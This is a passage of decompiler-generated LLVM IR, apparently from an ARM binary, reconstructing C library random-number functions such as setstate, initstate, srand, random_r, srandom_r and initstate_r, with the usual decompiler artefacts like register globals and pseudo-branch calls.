  ret i32 %tmp
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_f538 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_f538)
  %v0_f54c = load i32, i32* @r6, align 4
  %v2_f54c = add i32 %v0_f54c, 16
  %v3_f54c = inttoptr i32 %v2_f54c to i32*
  %v4_f54c = load i32, i32* %v3_f54c, align 4
  call void @__pseudo_branch(i32 %v4_f54c)
  %v0_f55c = load i32, i32* @r6, align 4
  %v2_f55c = add i32 %v0_f55c, 1724
  %v0_f564 = load i32, i32* @r5, align 4
  %v1_f568 = add i32 %v0_f55c, 1732
  %v2_f568 = inttoptr i32 %v1_f568 to i32*
  %v3_f568 = load i32, i32* %v2_f568, align 4
  store i32 %v3_f568, i32* @r4, align 4
  %v2_f56c = inttoptr i32 %v2_f55c to i32*
  %v3_f56c = call i32 @setstate_r(i32 %v0_f564, i32* %v2_f56c)
  %v1_f574 = icmp slt i32 %v3_f56c, 0
  %v3_f584 = load i32, i32* @r4, align 4
  %v4_f584 = add i32 %v3_f584, -4
  %storemerge = select i1 %v1_f574, i32 0, i32 %v4_f584
  %v0_f588 = load i32, i32* @r6, align 4
  %v2_f588 = add i32 %v0_f588, 48
  %v3_f588 = inttoptr i32 %v2_f588 to i32*
  %v4_f588 = load i32, i32* %v3_f588, align 4
  call void @__pseudo_branch(i32 %v4_f588)
  ret i32 %storemerge
}

define i32 @function_f5a8(i16* %arg1) local_unnamed_addr {
dec_label_pc_f5a8:
  %v0_f5a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f5a8, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_f5a8
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_f5a8
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_f5f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_f5f8)
  %v0_f60c = load i32, i32* @r4, align 4
  %v2_f60c = add i32 %v0_f60c, 16
  %v3_f60c = inttoptr i32 %v2_f60c to i32*
  %v4_f60c = load i32, i32* %v3_f60c, align 4
  call void @__pseudo_branch(i32 %v4_f60c)
  %v0_f61c = load i32, i32* @r6, align 4
  %v0_f620 = load i32, i32* @r4, align 4
  %v2_f620 = add i32 %v0_f620, 1724
  %v0_f624 = load i32, i32* @r7, align 4
  %v0_f628 = load i32, i32* @sl, align 4
  store i32 %v0_f628, i32* @r0, align 4
  %v1_f62c = add i32 %v0_f620, 1732
  %v2_f62c = inttoptr i32 %v1_f62c to i32*
  %v3_f62c = load i32, i32* %v2_f62c, align 4
  store i32 %v3_f62c, i32* @r5, align 4
  %v4_f630 = inttoptr i32 %v0_f628 to i32*
  %v5_f630 = call i32 @__GI_initstate_r(i32* %v4_f630, i32 %v0_f61c, i32 %v0_f624, i32 %v2_f620)
  %v0_f640 = load i32, i32* @r4, align 4
  %v2_f640 = add i32 %v0_f640, 48
  %v3_f640 = inttoptr i32 %v2_f640 to i32*
  %v4_f640 = load i32, i32* %v3_f640, align 4
  call void @__pseudo_branch(i32 %v4_f640)
  %v0_f64c = load i32, i32* @r5, align 4
  %v1_f64c = add i32 %v0_f64c, -4
  ret i32 %v1_f64c
}

define i32 @function_f668(i16* %arg1) local_unnamed_addr {
dec_label_pc_f668:
  %v0_f668 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f668, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_f668
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_f668
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_f680 = load i32, i32* @r4, align 4
  %v6_f680 = load i32, i32* @r5, align 4
  %v9_f680 = load i32, i32* @r6, align 4
  %v15_f680 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r4, align 4
  %v2_f694 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 1572), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_f6b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_f6b0)
  %v0_f6c4 = load i32, i32* @r4, align 4
  %v2_f6c4 = add i32 %v0_f6c4, 16
  %v3_f6c4 = inttoptr i32 %v2_f6c4 to i32*
  %v4_f6c4 = load i32, i32* %v3_f6c4, align 4
  call void @__pseudo_branch(i32 %v4_f6c4)
  %v0_f6d4 = load i32, i32* @r6, align 4
  store i32 %v0_f6d4, i32* @r0, align 4
  %v0_f6d8 = load i32, i32* @r4, align 4
  %v2_f6d8 = add i32 %v0_f6d8, 1724
  %v2_f6dc = inttoptr i32 %v0_f6d4 to i32*
  %v3_f6dc = call i32 @srandom_r(i32* %v2_f6dc, i32 %v2_f6d8)
  %v0_f6f0 = load i32, i32* @r4, align 4
  %v2_f6f0 = add i32 %v0_f6f0, 48
  %v3_f6f0 = inttoptr i32 %v2_f6f0 to i32*
  %v4_f6f0 = load i32, i32* %v3_f6f0, align 4
  call void @__pseudo_branch(i32 %v4_f6f0)
  store i32 %v3_f680, i32* @r4, align 4
  store i32 %v6_f680, i32* @r5, align 4
  store i32 %v9_f680, i32* @r6, align 4
  store i32 %v15_f680, i32* @lr, align 4
  ret i32 %v2_f694
}

define i32 @function_f70c(i16* %arg1) local_unnamed_addr {
dec_label_pc_f70c:
  %v0_f70c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f70c, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_f70c
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_f70c
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f724 = load i32, i32* @r4, align 4
  store i32 %v3_f724, i32* %stack_var_-8, align 4
  %v1_f728 = add i32 %tmp, 12
  %v2_f728 = inttoptr i32 %v1_f728 to i8*
  %v3_f728 = load i8, i8* %v2_f728, align 1
  %v4_f728 = sext i8 %v3_f728 to i32
  store i32 %v4_f728, i32* %r3.global-to-local, align 4
  %v2_f72c = icmp eq i8 %v3_f728, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_f738 = add i32 %tmp, 8
  %v2_f738 = inttoptr i32 %v1_f738 to i32*
  %v3_f738 = load i32, i32* %v2_f738, align 4
  store i32 %v3_f738, i32* %lr.global-to-local, align 4
  br i1 %v2_f72c, label %dec_label_pc_f740, label %dec_label_pc_f764

dec_label_pc_f740:                                ; preds = %entry
  %v1_f740 = inttoptr i32 %v3_f738 to i32*
  %v2_f740 = load i32, i32* %v1_f740, align 4
  store i32 %v2_f740, i32* %r2.global-to-local, align 4
  %v2_f748 = mul i32 %v2_f740, 1103515245
  %v1_f750 = add i32 %v2_f748, 12345
  %tmp6 = bitcast i32 %v1_f750 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_f754 = bitcast float %tmp7 to i32
  store i32 %v1_f754, i32* %r3.global-to-local, align 4
  store i32 %v1_f754, i32* %v1_f740, align 4
  %v0_f75c = load i32, i32* %r3.global-to-local, align 4
  %v2_f75c = inttoptr i32 %arg2 to i32*
  store i32 %v0_f75c, i32* %v2_f75c, align 4
  br label %dec_label_pc_f7a4

dec_label_pc_f764:                                ; preds = %entry
  %v2_f764 = load i32, i32* %arg1, align 4
  store i32 %v2_f764, i32* %r2.global-to-local, align 4
  %v1_f768 = add i32 %tmp, 4
  %v2_f768 = inttoptr i32 %v1_f768 to i32*
  %v3_f768 = load i32, i32* %v2_f768, align 4
  store i32 %v3_f768, i32* %r0.global-to-local, align 4
  %v1_f76c = inttoptr i32 %v2_f764 to i32*
  %v2_f76c = load i32, i32* %v1_f76c, align 4
  store i32 %v2_f76c, i32* %r1.global-to-local, align 4
  %v1_f770 = inttoptr i32 %v3_f768 to i32*
  %v2_f770 = load i32, i32* %v1_f770, align 4
  %v4_f770 = add i32 %v3_f768, 4
  store i32 %v4_f770, i32* %r0.global-to-local, align 4
  %v2_f774 = add i32 %v2_f770, %v2_f76c
  store i32 %v2_f774, i32* %r3.global-to-local, align 4
  store i32 %v2_f774, i32* %v1_f76c, align 4
  %v3_f778 = load i32, i32* %r2.global-to-local, align 4
  %v4_f778 = add i32 %v3_f778, 4
  store i32 %v4_f778, i32* %r2.global-to-local, align 4
  %v0_f77c = load i32, i32* %ip.global-to-local, align 4
  %v1_f77c = add i32 %v0_f77c, 16
  %v2_f77c = inttoptr i32 %v1_f77c to i32*
  %v3_f77c = load i32, i32* %v2_f77c, align 4
  store i32 %v3_f77c, i32* %r1.global-to-local, align 4
  %v0_f780 = load i32, i32* %r3.global-to-local, align 4
  %v3_f780 = udiv i32 %v0_f780, 2
  store i32 %v3_f780, i32* %r3.global-to-local, align 4
  %v3_f784 = icmp ult i32 %v4_f778, %v3_f77c
  %v1_f788 = load i32, i32* %r4.global-to-local, align 4
  %v2_f788 = inttoptr i32 %v1_f788 to i32*
  store i32 %v3_f780, i32* %v2_f788, align 4
  br i1 %v3_f784, label %dec_label_pc_f794, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_f764
  %v1_f78c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_f78c, i32* %r2.global-to-local, align 4
  %v0_f79c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_f794:                                ; preds = %dec_label_pc_f764
  %v0_f794 = load i32, i32* %r0.global-to-local, align 4
  %v1_f794 = load i32, i32* %r1.global-to-local, align 4
  %v3_f794 = icmp ult i32 %v0_f794, %v1_f794
  br i1 %v3_f794, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_f794
  %v1_f798 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_f798, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_f794, %._crit_edge, %bb
  %v0_f79c = phi i32 [ %v0_f79c.pre, %._crit_edge ], [ %v0_f794, %dec_label_pc_f794 ], [ %v1_f798, %bb ]
  %v1_f79c = load i32, i32* %ip.global-to-local, align 4
  %v2_f79c = add i32 %v1_f79c, 4
  %v3_f79c = inttoptr i32 %v2_f79c to i32*
  store i32 %v0_f79c, i32* %v3_f79c, align 4
  %v0_f7a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f7a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_f7a0 = inttoptr i32 %v1_f7a0 to i32*
  store i32 %v0_f7a0, i32* %v2_f7a0, align 4
  br label %dec_label_pc_f7a4

dec_label_pc_f7a4:                                ; preds = %dec_label_pc_f740, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_f7a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f7a8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_f780, { 1, 0 }
  uselistorder i32 %v1_f754, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_f7a4, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f7b4 = load i32, i32* @r4, align 4
  store i32 %v3_f7b4, i32* %stack_var_-36, align 4
  %v1_f7b8 = add i32 %tmp, 12
  %v2_f7b8 = inttoptr i32 %v1_f7b8 to i8*
  %v3_f7b8 = load i8, i8* %v2_f7b8, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_f7c8 = load i8, i8* %v2_f7b8, align 1
  %tmp33 = icmp ugt i8 %v3_f7b8, 4
  br i1 %tmp33, label %.dec_label_pc_f874_crit_edge, label %dec_label_pc_f7d4

.dec_label_pc_f874_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_f874

dec_label_pc_f7d4:                                ; preds = %entry
  %v0_f7d4 = load i32, i32* @r0, align 4
  %v2_f7d4 = icmp eq i32 %v0_f7d4, 0
  %v1_f7d8 = add i32 %tmp, 8
  %v2_f7d8 = inttoptr i32 %v1_f7d8 to i32*
  %v3_f7d8 = load i32, i32* %v2_f7d8, align 4
  store i32 %v3_f7d8, i32* %r6.global-to-local, align 4
  br i1 %v2_f7d4, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_f7d4
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_f7d4, %bb
  %v0_f7e4 = phi i32 [ %v0_f7d4, %dec_label_pc_f7d4 ], [ 1, %bb ]
  %v2_f7e0 = icmp eq i8 %v3_f7c8, 0
  %v2_f7e4 = inttoptr i32 %v3_f7d8 to i32*
  store i32 %v0_f7e4, i32* %v2_f7e4, align 4
  br i1 %v2_f7e0, label %dec_label_pc_f870, label %dec_label_pc_f7ec

dec_label_pc_f7ec:                                ; preds = %bb23
  %v1_f7ec = add i32 %tmp, 13
  %v2_f7ec = inttoptr i32 %v1_f7ec to i8*
  %v3_f7ec = load i8, i8* %v2_f7ec, align 1
  %v4_f7ec = sext i8 %v3_f7ec to i32
  store i32 %v4_f7ec, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_f7f8 = load i32, i32* @r0, align 4
  store i32 %v0_f7f8, i32* %r4.global-to-local, align 4
  %v0_f7fc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_f7fc, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_f83c25 = icmp sgt i8 %v3_f7ec, 1
  br i1 %v5_f83c25, label %dec_label_pc_f808, label %dec_label_pc_f840

dec_label_pc_f808:                                ; preds = %dec_label_pc_f7ec, %dec_label_pc_f808.dec_label_pc_f808_crit_edge
  %v1_f81c = phi i32 [ %v1_f81c.pre, %dec_label_pc_f808.dec_label_pc_f808_crit_edge ], [ 2836, %dec_label_pc_f7ec ]
  %v1_f810 = phi i32 [ %v1_f810.pre, %dec_label_pc_f808.dec_label_pc_f808_crit_edge ], [ 16807, %dec_label_pc_f7ec ]
  %v0_f80c27 = phi i32 [ %v0_f830.pre, %dec_label_pc_f808.dec_label_pc_f808_crit_edge ], [ %v0_f7f8, %dec_label_pc_f7ec ]
  %v1_f82826 = phi i32 [ %v5_f828, %dec_label_pc_f808.dec_label_pc_f808_crit_edge ], [ %v0_f7fc, %dec_label_pc_f7ec ]
  %v3_f808 = urem i32 %v0_f80c27, 127773
  %v2_f810 = mul i32 %v1_f810, %v3_f808
  %v2_f818 = sdiv i32 %v0_f80c27, 127773
  %v2_f81c = mul i32 %v1_f81c, %v2_f818
  %v2_f820 = sub i32 %v2_f810, %v2_f81c
  %v8_f820 = icmp slt i32 %v2_f820, 0
  %v2_f824 = add i32 %v2_f820, 2147483647
  %v2_f824.v2_f820 = select i1 %v8_f820, i32 %v2_f824, i32 %v2_f820
  store i32 %v2_f824.v2_f820, i32* %r4.global-to-local, align 4
  %v2_f828 = add i32 %v1_f82826, 4
  %v3_f828 = inttoptr i32 %v2_f828 to i32*
  store i32 %v2_f824.v2_f820, i32* %v3_f828, align 4
  %v4_f828 = load i32, i32* %r8.global-to-local, align 4
  %v5_f828 = add i32 %v4_f828, 4
  store i32 %v5_f828, i32* %r8.global-to-local, align 4
  %v0_f82c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_f82c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_f830.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_f838 = add i32 %v0_f82c.pre, 1
  store i32 %v1_f838, i32* %r7.global-to-local, align 4
  %v5_f83c = icmp slt i32 %v0_f82c.pre, %v1_f82c.pre
  br i1 %v5_f83c, label %dec_label_pc_f808.dec_label_pc_f808_crit_edge, label %dec_label_pc_f82c.dec_label_pc_f840_crit_edge

dec_label_pc_f808.dec_label_pc_f808_crit_edge:    ; preds = %dec_label_pc_f808
  %v1_f810.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_f81c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_f808

dec_label_pc_f82c.dec_label_pc_f840_crit_edge:    ; preds = %dec_label_pc_f808
  %v0_f850.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f840

dec_label_pc_f840:                                ; preds = %dec_label_pc_f82c.dec_label_pc_f840_crit_edge, %dec_label_pc_f7ec
  %v0_f850 = phi i32 [ %v0_f850.pre, %dec_label_pc_f82c.dec_label_pc_f840_crit_edge ], [ %v0_f7fc, %dec_label_pc_f7ec ]
  %v0_f844.lcssa = phi i32 [ %v1_f82c.pre, %dec_label_pc_f82c.dec_label_pc_f840_crit_edge ], [ %v4_f7ec, %dec_label_pc_f7ec ]
  %v2_f844 = mul i32 %v0_f844.lcssa, 10
  store i32 %v2_f844, i32* @r4, align 4
  %v0_f848 = load i32, i32* %r5.global-to-local, align 4
  %v1_f848 = add i32 %v0_f848, 14
  %v2_f848 = inttoptr i32 %v1_f848 to i8*
  %v3_f848 = load i8, i8* %v2_f848, align 1
  %v4_f848 = sext i8 %v3_f848 to i32
  %v2_f84c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_f84c, i32* %r7.global-to-local, align 4
  %v4_f850 = mul nsw i32 %v4_f848, 4
  %v5_f850 = add i32 %v0_f850, %v4_f850
  %v1_f854 = inttoptr i32 %v0_f848 to i32*
  store i32 %v5_f850, i32* %v1_f854, align 4
  %v3_f854 = add i32 %v0_f848, 4
  %v4_f854 = inttoptr i32 %v3_f854 to i32*
  %v5_f854 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_f854, i32* %v4_f854, align 4
  br label %dec_label_pc_f860

dec_label_pc_f85c:                                ; preds = %dec_label_pc_f860
  %v0_f864 = load i32, i32* %r5.global-to-local, align 4
  %v2_f85c = inttoptr i32 %v0_f864 to i32*
  %v3_f85c = call i32 @__GI_random_r(i32* %v2_f85c, i32 %v2_f84c)
  br label %dec_label_pc_f860

dec_label_pc_f860:                                ; preds = %dec_label_pc_f840, %dec_label_pc_f85c
  %v0_f860 = load i32, i32* @r4, align 4
  %v1_f860 = add i32 %v0_f860, -1
  store i32 %v1_f860, i32* @r4, align 4
  %v6_f860 = icmp slt i32 %v1_f860, 0
  br i1 %v6_f860, label %dec_label_pc_f870, label %dec_label_pc_f85c

dec_label_pc_f870:                                ; preds = %dec_label_pc_f860, %bb23
  %v2_f878.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_f874

dec_label_pc_f874:                                ; preds = %.dec_label_pc_f874_crit_edge, %dec_label_pc_f870
  %v2_f878 = phi i32 [ %v3_f7b4, %.dec_label_pc_f874_crit_edge ], [ %v2_f878.pre, %dec_label_pc_f870 ]
  %v1_f87c = phi i32 [ -1, %.dec_label_pc_f874_crit_edge ], [ 0, %dec_label_pc_f870 ]
  store i32 %v2_f878, i32* @r4, align 4
  ret i32 %v1_f87c

; uselistorder directives
  uselistorder i32 %v1_f860, { 1, 0 }
  uselistorder i32 %v0_f848, { 1, 0, 2 }
  uselistorder i32 %v0_f82c.pre, { 1, 0 }
  uselistorder i32 %v5_f828, { 1, 0 }
  uselistorder i32 %v0_f80c27, { 1, 0 }
  uselistorder i32 %v0_f7fc, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 0, 3, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_f874, { 1, 0 }
  uselistorder label %dec_label_pc_f860, { 1, 0 }
  uselistorder label %dec_label_pc_f808, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f880:
  %v0_f880 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f880, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_f880
  %v2_f880 = load i32, i32* @r7, align 4
  %v5_f880 = udiv i32 %v2_f880, 8
  %v6_f880 = and i32 %v5_f880, %arg1
  %v3_f884 = load i32, i32* @fp, align 4
  %v8_f884 = shl i32 %v6_f880, %v3_f884
  %v9_f884 = and i32 %v8_f884, %arg1
  %v2_f888 = load i32, i32* @sp, align 4
  %v8_f888 = shl i32 %v2_f888, %arg3
  %v9_f888 = and i32 %v8_f888, %arg2
  call void @__pseudo_branch(i32 %v9_f888)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_f880, %bb
  %v10_f888 = phi i32 [ %arg1, %dec_label_pc_f880 ], [ %v9_f884, %bb ]
  ret i32 %v10_f888

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_f88c = load i32, i32* @r4, align 4
  %v6_f88c = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_f8bc, label %dec_label_pc_f8ac

dec_label_pc_f8ac:                                ; preds = %entry
  %v2_f8ac = icmp ugt i32 %arg2, 254
  %v7_f8ac = icmp eq i32 %arg2, 255
  %v2_f8b0 = xor i1 %v7_f8ac, true
  %v3_f8b0 = and i1 %v2_f8ac, %v2_f8b0
  br i1 %v3_f8b0, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_f8ac
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_f8ac, %bb
  %v1_f8e87 = phi i32 [ %v3_f88c, %dec_label_pc_f8ac ], [ 4, %bb ]
  %v2_f8b4 = xor i1 %v2_f8ac, true
  %v3_f8b4 = or i1 %v7_f8ac, %v2_f8b4
  br i1 %v3_f8b4, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_f8bc:                                ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_f8d4, label %dec_label_pc_f8c4

dec_label_pc_f8c4:                                ; preds = %dec_label_pc_f8bc
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_f944

.thread10:                                        ; preds = %dec_label_pc_f8c4
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_f8d4:                                ; preds = %dec_label_pc_f8bc
  %v2_f8d4 = icmp ugt i32 %arg2, 62
  %v7_f8d4 = icmp eq i32 %arg2, 63
  %v2_f8d8 = xor i1 %v7_f8d4, true
  %v3_f8d8 = and i1 %v2_f8d4, %v2_f8d8
  br i1 %v3_f8d8, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_f8d4
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_f8d4, %bb23
  %v1_f8e86 = phi i32 [ %v3_f88c, %dec_label_pc_f8d4 ], [ 2, %bb23 ]
  %v2_f8dc = xor i1 %v2_f8d4, true
  %v3_f8dc = or i1 %v7_f8d4, %v2_f8dc
  br i1 %v3_f8dc, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_f8f4 = phi i32 [ 3, %bb22 ], [ %v1_f8e87, %bb21 ], [ %v1_f8e86, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -35856), i32* %r3.global-to-local, align 4
  %v4_f8e8 = mul i32 %v1_f8f4, 4
  %v5_f8e8 = add i32 %v4_f8e8, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -35856)
  store i32 %v5_f8e8, i32* %r2.global-to-local, align 4
  %v1_f8ec = add i32 %v4_f8e8, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -35836)
  %v2_f8ec = inttoptr i32 %v1_f8ec to i32*
  %v3_f8ec = load i32, i32* %v2_f8ec, align 4
  store i32 %v3_f8ec, i32* %r1.global-to-local, align 4
  %v1_f8f0 = add i32 %tmp, 4
  store i32 %v1_f8f0, i32* @r6, align 4
  %v6_f8f4 = inttoptr i32 %v5_f8e8 to i32*
  %v7_f8f4 = load i32, i32* %v6_f8f4, align 4
  store i32 %v7_f8f4, i32* %r2.global-to-local, align 4
  %v4_f8f8 = mul i32 %v3_f8ec, 4
  %v5_f8f8 = add i32 %v4_f8f8, %v1_f8f0
  store i32 %v5_f8f8, i32* %r3.global-to-local, align 4
  %v2_f8fc = add i32 %arg3, 16
  %v3_f8fc = inttoptr i32 %v2_f8fc to i32*
  store i32 %v5_f8f8, i32* %v3_f8fc, align 4
  %v0_f900 = load i32, i32* %r2.global-to-local, align 4
  %v1_f900 = trunc i32 %v0_f900 to i8
  %v2_f900 = load i32, i32* @r5, align 4
  %v3_f900 = add i32 %v2_f900, 14
  %v4_f900 = inttoptr i32 %v3_f900 to i8*
  store i8 %v1_f900, i8* %v4_f900, align 1
  %v0_f904 = load i32, i32* %r1.global-to-local, align 4
  %v1_f904 = trunc i32 %v0_f904 to i8
  %v2_f904 = load i32, i32* @r5, align 4
  %v3_f904 = add i32 %v2_f904, 13
  %v4_f904 = inttoptr i32 %v3_f904 to i8*
  store i8 %v1_f904, i8* %v4_f904, align 1
  %v0_f908 = load i32, i32* @r4, align 4
  %v1_f908 = trunc i32 %v0_f908 to i8
  %v2_f908 = load i32, i32* @r5, align 4
  %v3_f908 = add i32 %v2_f908, 12
  %v4_f908 = inttoptr i32 %v3_f908 to i8*
  store i8 %v1_f908, i8* %v4_f908, align 1
  %v0_f90c = load i32, i32* @r6, align 4
  %v1_f90c = load i32, i32* @r5, align 4
  %v2_f90c = add i32 %v1_f90c, 8
  %v3_f90c = inttoptr i32 %v2_f90c to i32*
  store i32 %v0_f90c, i32* %v3_f90c, align 4
  %v0_f910 = load i32, i32* @r5, align 4
  store i32 %v0_f910, i32* %r1.global-to-local, align 4
  %v0_f914 = load i32, i32* @r0, align 4
  %v2_f914 = inttoptr i32 %v0_f914 to i32*
  %v3_f914 = call i32 @srandom_r(i32* %v2_f914, i32 %v0_f910)
  store i32 %v3_f914, i32* %r0.global-to-local, align 4
  %v0_f918 = load i32, i32* @r4, align 4
  %v2_f918 = icmp eq i32 %v0_f918, 0
  br i1 %v2_f918, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_f93412 = load i32, i32* @r7, align 4
  %v2_f93413 = inttoptr i32 %v1_f93412 to i32*
  store i32 0, i32* %v2_f93413, align 4
  %v1_f938 = load i32, i32* @r4, align 4
  store i32 %v1_f938, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f968

.thread4:                                         ; preds = %bb26
  %v1_f91c = load i32, i32* @r5, align 4
  %v2_f91c = add i32 %v1_f91c, 4
  %v3_f91c = inttoptr i32 %v2_f91c to i32*
  %v4_f91c = load i32, i32* %v3_f91c, align 4
  %v1_f920 = load i32, i32* @r6, align 4
